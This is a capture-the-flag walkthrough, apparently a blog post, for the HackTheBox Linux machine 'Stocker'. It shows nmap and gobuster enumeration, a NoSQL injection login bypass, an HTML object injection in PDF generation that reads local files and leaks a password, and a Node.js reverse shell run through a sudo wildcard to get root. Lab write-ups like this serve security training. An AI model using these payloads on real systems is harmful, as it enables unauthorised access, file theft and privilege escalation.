# :game_die: HackTheBox Machine Stocker

---

# HackTheBox Machine Stocker

- Stocker is a medium difficulty Linux machine that features a website running on port 80 that advertises various house furniture.

You can also read this here: [https://aftabsama.com/writeups/hackthebox/machine-stocker/](https://aftabsama.com/writeups/hackthebox/machine-stocker/)

## HTB Machine Stocker

we atart with nmap scan:

```
┌──(Jack㉿Sparrow)-[~/Downloads/htb/stocker]
└─$ sudo nmap -sS -sC -T5 10.10.11.196 -oN nmap.txt
[sudo] password for Jack:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 02:18 EDT
Nmap scan report for 10.10.11.196
Host is up (0.68s latency).
Not shown: 938 closed tcp ports (reset), 60 filtered tcp ports (no-response)
PORT STATE SERVICE
22/tcp open ssh
| ssh-hostkey:
| 3072 3d12971d86bc161683608f4f06e6d54e (RSA)
| 256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_ 256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open http
|_http-title: Did not follow redirect to http://stocker.htb
Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds
```

we have 2 ports open: 22(ssh) , 80(http)

add `stocker.htb` to `/etc/hosts` file

visiting this page we see one comment from `Angoose Garden, Head of IT at Stockers Ltd.`

next we try to bruteforce subdomains:

```
┌──(Jack㉿Sparrow)-[~]
└─$ gobuster vhost -u stocker.htb -w /usr/share/wordlists/dirb/common.txt --append-domain -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://stocker.htb
[+] Method: GET
[+] Threads: 100
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
[+] User Agent: gobuster/3.5
[+] Timeout: 10s
[+] Append Domain: true
===============================================================
2023/03/30 02:44:46 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/30 02:45:04 Finished
===============================================================
```

again we need to add `dev.stocker.htb` to `/etc/hosts` file

after few try and errors we found that login page is vulnerable to NoSQL Injection.

`Content-Type: application/json`

Payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`

here we can purchase something through api and on view order it will generate pdf or that order.

we can try to Read local file.

## Get Aftab Sama’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Path:`api/order` Payload:

```
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<object data='file:///etc/passwd'>","description":"It's a red cup.","image":"/etc/passwd","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

response:

```
{"success":true,"orderId":"642550c92e188ca84f0a3f46"}
```

we can see generated PDF at `/api/po/642550c92e188ca84f0a3f46`

it is not complete we can modify our payload to:

```
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<object data='file:///var/www/dev/index.js' height=800 width=800>","description":"It's a red cup.","image":"Yo","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

result:

we found Password: `IHeardPassphrasesArePrettySecure`

previously we show one comment from Angoose Garden, Head of IT at Stockers Ltd.

we can try this username:`Angoose` and password on ssh.

chech root Permission using `sudo -l`

```
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Sorry, try again.
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User angoose may run the following commands on stocker:
(ALL) /usr/bin/node /usr/local/scripts/*.js
```

we can escalate our privilege with node

Payload:

```
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("bash", []);
var client = new net.Socket();
client.connect(8888, "127.0.0.1", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application from crashing
})();
```

Reference: [https://www.revshells.com/](https://www.revshells.com/)

save this as js file and run using sudo and path traversal.

Now we are root.

Happy Hacking

---
